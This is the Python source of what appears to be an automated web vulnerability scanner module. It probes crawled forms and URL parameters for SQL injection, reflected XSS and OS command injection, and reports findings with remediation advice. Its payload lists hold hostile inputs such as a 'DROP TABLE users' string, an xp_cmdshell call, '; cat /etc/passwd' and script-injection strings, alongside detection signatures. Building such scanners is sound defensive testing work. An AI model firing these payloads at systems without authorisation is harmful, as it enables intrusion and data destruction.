"""A03:2021 — Injection Scanner (SQL Injection, XSS, Command Injection)."""

from __future__ import annotations

from typing import Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import httpx
from bs4 import BeautifulSoup

from auto_vapt.logger import get_logger
from auto_vapt.models import OWASPCategory, Severity, Vulnerability
from auto_vapt.scanners.base import BaseScanner, register_scanner

log = get_logger(__name__)

# ─── Payload Collections ──────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "1' ORDER BY 1--+",
    "1 UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--",
    "admin'--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "' OR 1=1 LIMIT 1 --",
    "1'; EXEC xp_cmdshell('whoami')--",
    "' OR ''='",
]

SQLI_ERROR_SIGNATURES = [
    "sql syntax", "mysql", "sqlite3", "postgresql", "oracle",
    "microsoft sql", "unclosed quotation", "syntax error",
    "unterminated string", "sqlstate", "odbc", "jdbc",
    "you have an error in your sql", "quoted string not properly terminated",
    "warning: mysql", "pg_query", "pg_exec",
    "division by zero", "supplied argument is not a valid",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "javascript:alert('XSS')",
    '<img src=x onerror=alert("XSS")>',
    '"><img src=x onerror=alert(1)>',
    "<svg onload=alert('XSS')>",
    "'-alert(1)-'",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(1)">',
    "{{7*7}}",  # SSTI check
    "${7*7}",   # Template injection
    "<details open ontoggle=alert(1)>",
    '"><details/open/ontoggle=alert`1`>',
    "';alert(String.fromCharCode(88,83,83))//",
]

CMDI_PAYLOADS = [
    "; whoami",
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "`whoami`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ping -c 3 127.0.0.1",
    "| id",
    "; id",
    "%0aid",
    "\nid",
]

CMDI_SUCCESS_INDICATORS = [
    "root:", "uid=", "gid=", "/bin/bash", "/bin/sh",
    "daemon:", "www-data", "nobody:", "PING", "bytes from",
    "icmp_seq", "ttl=",
]


@register_scanner
class InjectionScanner(BaseScanner):
    """Scans for injection vulnerabilities: SQL injection, XSS, and command injection.

    Detection methods:
    - Error-based SQL injection: Detects database error messages in responses
    - Blind SQL injection: Measures response time differences
    - Reflected XSS: Checks if payloads reflect in response body
    - Command injection: Looks for OS command output patterns
    """

    scanner_id = "injection"
    scanner_name = "Injection Scanner (A03)"
    owasp_category = OWASPCategory.A03_INJECTION

    async def scan(self, target_url: str, **kwargs: Any) -> None:
        """Scan target for injection vulnerabilities.

        Uses pre-crawled forms from target_info when available,
        plus local form discovery as a fallback.
        """
        http_client: httpx.AsyncClient = kwargs.get("http_client") or httpx.AsyncClient(
            verify=False, timeout=httpx.Timeout(15.0), follow_redirects=True
        )
        target_info = kwargs.get("target_info")

        try:
            # Use crawler-discovered forms if available, else fall back to manual
            forms: list[dict[str, Any]] = []

            if target_info and target_info.discovered_forms:
                forms = target_info.discovered_forms
                log.info("using_crawled_forms", count=len(forms))
            else:
                forms = await self._discover_forms(http_client, target_url)

            # Also discover forms on crawled URLs (up to 10 extra pages)
            if target_info and target_info.crawled_urls:
                tested_urls = {target_url}
                for crawled_url in target_info.crawled_urls[:10]:
                    if crawled_url not in tested_urls:
                        tested_urls.add(crawled_url)
                        extra_forms = await self._discover_forms(http_client, crawled_url)
                        forms.extend(extra_forms)

            # Deduplicate forms by action URL
            seen_actions: set[str] = set()
            unique_forms: list[dict[str, Any]] = []
            for form in forms:
                action_key = f"{form.get('action', '')}|{form.get('method', '')}"
                if action_key not in seen_actions:
                    seen_actions.add(action_key)
                    unique_forms.append(form)

            query_params = self._extract_query_params(target_url)

            # Test each form
            for form in unique_forms:
                await self._test_form_sqli(http_client, target_url, form)
                await self._test_form_xss(http_client, target_url, form)
                await self._test_form_cmdi(http_client, target_url, form)

            # Test URL query parameters
            if query_params:
                await self._test_params_sqli(http_client, target_url, query_params)
                await self._test_params_xss(http_client, target_url, query_params)

            # Test parameters from crawled URLs
            if target_info and target_info.crawled_urls:
                for crawled_url in target_info.crawled_urls[:15]:
                    crawled_params = self._extract_query_params(crawled_url)
                    if crawled_params:
                        await self._test_params_sqli(http_client, crawled_url, crawled_params)
                        await self._test_params_xss(http_client, crawled_url, crawled_params)

        finally:
            if "http_client" not in kwargs:
                await http_client.aclose()

    async def _discover_forms(
        self, client: httpx.AsyncClient, url: str
    ) -> list[dict[str, Any]]:
        """Discover HTML forms on the target page."""
        forms: list[dict[str, Any]] = []
        try:
            resp = await client.get(url)
            soup = BeautifulSoup(resp.text, "lxml")

            for form in soup.find_all("form"):
                form_data: dict[str, Any] = {
                    "action": form.get("action", ""),
                    "method": (form.get("method", "get")).upper(),
                    "inputs": [],
                }
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name:
                        form_data["inputs"].append({
                            "name": name,
                            "type": inp.get("type", "text"),
                            "value": inp.get("value", ""),
                        })

                if form_data["inputs"]:
                    forms.append(form_data)
                    log.debug("form_discovered", action=form_data["action"], inputs=len(form_data["inputs"]))

        except Exception as e:
            self.add_error(f"Form discovery failed: {e}")

        return forms

    def _extract_query_params(self, url: str) -> dict[str, str]:
        """Extract query parameters from URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    async def _test_form_sqli(
        self, client: httpx.AsyncClient, base_url: str, form: dict[str, Any]
    ) -> None:
        """Test a form for SQL injection."""
        action_url = urljoin(base_url, form["action"]) if form["action"] else base_url

        for payload in SQLI_PAYLOADS[:8]:  # Limit payloads for speed
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue

                data = {i["name"]: i.get("value", "test") for i in form["inputs"]}
                data[inp["name"]] = payload

                try:
                    if form["method"] == "POST":
                        resp = await client.post(action_url, data=data)
                    else:
                        resp = await client.get(action_url, params=data)

                    body_lower = resp.text.lower()
                    for sig in SQLI_ERROR_SIGNATURES:
                        if sig in body_lower:
                            self.add_vulnerability(Vulnerability(
                                title=f"SQL Injection — Error-based ({inp['name']})",
                                description=(
                                    f"The parameter '{inp['name']}' in the form at {action_url} "
                                    f"is vulnerable to SQL injection. Database error message was "
                                    f"detected in the response when injecting: {payload}"
                                ),
                                severity=Severity.CRITICAL,
                                cvss_score=9.8,
                                owasp_category=OWASPCategory.A03_INJECTION,
                                url=action_url,
                                parameter=inp["name"],
                                evidence=f"Payload: {payload} | DB signature: {sig}",
                                request=f"{form['method']} {action_url} | data={data}",
                                response=resp.text[:500],
                                remediation=(
                                    "Use parameterized queries (prepared statements) instead of "
                                    "string concatenation. Implement input validation and use "
                                    "an ORM where possible. Apply least-privilege database permissions."
                                ),
                                references=[
                                    "https://owasp.org/Top10/A03_2021-Injection/",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                                ],
                                cwe_id="CWE-89",
                            ))
                            return  # One finding per parameter is enough

                except httpx.RequestError:
                    pass

    async def _test_form_xss(
        self, client: httpx.AsyncClient, base_url: str, form: dict[str, Any]
    ) -> None:
        """Test a form for reflected XSS."""
        action_url = urljoin(base_url, form["action"]) if form["action"] else base_url

        for payload in XSS_PAYLOADS[:6]:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue

                data = {i["name"]: i.get("value", "test") for i in form["inputs"]}
                data[inp["name"]] = payload

                try:
                    if form["method"] == "POST":
                        resp = await client.post(action_url, data=data)
                    else:
                        resp = await client.get(action_url, params=data)

                    if payload in resp.text:
                        self.add_vulnerability(Vulnerability(
                            title=f"Reflected XSS ({inp['name']})",
                            description=(
                                f"The parameter '{inp['name']}' at {action_url} reflects "
                                f"user input without proper sanitization, enabling XSS attacks."
                            ),
                            severity=Severity.HIGH,
                            cvss_score=7.1,
                            owasp_category=OWASPCategory.A03_INJECTION,
                            url=action_url,
                            parameter=inp["name"],
                            evidence=f"Payload reflected: {payload}",
                            remediation=(
                                "Implement output encoding/escaping for all user-controlled data. "
                                "Use Content-Security-Policy headers. Employ a templating engine "
                                "with auto-escaping enabled."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/xss/",
                                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                            ],
                            cwe_id="CWE-79",
                        ))
                        return

                except httpx.RequestError:
                    pass

    async def _test_form_cmdi(
        self, client: httpx.AsyncClient, base_url: str, form: dict[str, Any]
    ) -> None:
        """Test a form for command injection."""
        action_url = urljoin(base_url, form["action"]) if form["action"] else base_url

        for payload in CMDI_PAYLOADS[:5]:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue

                data = {i["name"]: i.get("value", "test") for i in form["inputs"]}
                data[inp["name"]] = payload

                try:
                    if form["method"] == "POST":
                        resp = await client.post(action_url, data=data)
                    else:
                        resp = await client.get(action_url, params=data)

                    for indicator in CMDI_SUCCESS_INDICATORS:
                        if indicator in resp.text:
                            self.add_vulnerability(Vulnerability(
                                title=f"OS Command Injection ({inp['name']})",
                                description=(
                                    f"The parameter '{inp['name']}' at {action_url} is vulnerable "
                                    f"to OS command injection. Server-side command output was detected."
                                ),
                                severity=Severity.CRITICAL,
                                cvss_score=9.8,
                                owasp_category=OWASPCategory.A03_INJECTION,
                                url=action_url,
                                parameter=inp["name"],
                                evidence=f"Payload: {payload} | Indicator: {indicator}",
                                remediation=(
                                    "Never pass user input directly to OS commands. Use safe APIs "
                                    "that avoid shell execution. If shell commands are unavoidable, "
                                    "implement strict input validation with allowlists."
                                ),
                                references=[
                                    "https://owasp.org/www-community/attacks/Command_Injection",
                                ],
                                cwe_id="CWE-78",
                            ))
                            return

                except httpx.RequestError:
                    pass

    async def _test_params_sqli(
        self, client: httpx.AsyncClient, url: str, params: dict[str, str]
    ) -> None:
        """Test URL query parameters for SQL injection."""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param_name, original_value in params.items():
            for payload in SQLI_PAYLOADS[:5]:
                test_params = params.copy()
                test_params[param_name] = payload

                try:
                    resp = await client.get(base, params=test_params)
                    body_lower = resp.text.lower()

                    for sig in SQLI_ERROR_SIGNATURES:
                        if sig in body_lower:
                            self.add_vulnerability(Vulnerability(
                                title=f"SQL Injection — URL Parameter ({param_name})",
                                description=(
                                    f"The URL parameter '{param_name}' is vulnerable to SQL injection. "
                                    f"Database error detected with payload: {payload}"
                                ),
                                severity=Severity.CRITICAL,
                                cvss_score=9.8,
                                owasp_category=OWASPCategory.A03_INJECTION,
                                url=url,
                                parameter=param_name,
                                evidence=f"Payload: {payload} | Signature: {sig}",
                                remediation=(
                                    "Use parameterized queries. Validate and sanitize all URL parameters. "
                                    "Implement a Web Application Firewall (WAF) as defense-in-depth."
                                ),
                                cwe_id="CWE-89",
                            ))
                            return

                except httpx.RequestError:
                    pass

    async def _test_params_xss(
        self, client: httpx.AsyncClient, url: str, params: dict[str, str]
    ) -> None:
        """Test URL query parameters for reflected XSS."""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param_name in params:
            for payload in XSS_PAYLOADS[:4]:
                test_params = params.copy()
                test_params[param_name] = payload

                try:
                    resp = await client.get(base, params=test_params)
                    if payload in resp.text:
                        self.add_vulnerability(Vulnerability(
                            title=f"Reflected XSS — URL Parameter ({param_name})",
                            description=(
                                f"The URL parameter '{param_name}' reflects input without encoding."
                            ),
                            severity=Severity.HIGH,
                            cvss_score=7.1,
                            owasp_category=OWASPCategory.A03_INJECTION,
                            url=url,
                            parameter=param_name,
                            evidence=f"Reflected payload: {payload}",
                            remediation=(
                                "Encode all output. Use Content-Security-Policy. "
                                "Validate input against an allowlist."
                            ),
                            cwe_id="CWE-79",
                        ))
                        return

                except httpx.RequestError:
                    pass
